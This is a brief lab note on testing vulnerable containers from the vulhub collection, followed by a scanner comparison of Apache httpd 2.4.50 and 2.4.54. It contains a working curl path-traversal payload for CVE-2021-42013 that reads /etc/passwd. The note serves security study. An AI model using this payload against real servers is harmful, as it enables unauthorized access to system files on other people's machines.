**Vulnerable container List**
https://github.com/vulhub/vulhub
We tried to run these containers and execute vulnerabilities
As an example Apache HTTP Server 2.4.50 container have vulnerability  where you can see the folders you not access to:
by running this code
```
curl -v --path-as-is http://your-ip:8080/icons/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd
```
![enter image description here](https://github.com/vulhub/vulhub/raw/master/httpd/CVE-2021-42013/1.png)

For comparison here is results of scanning old vulnerable container of apache httpd 2.4.50 and latest 2.4.54
Both have security problems 
![enter image description here](https://i.imgur.com/Dj2e5df.png)![enter image description here](https://i.imgur.com/k24BjuE.png)
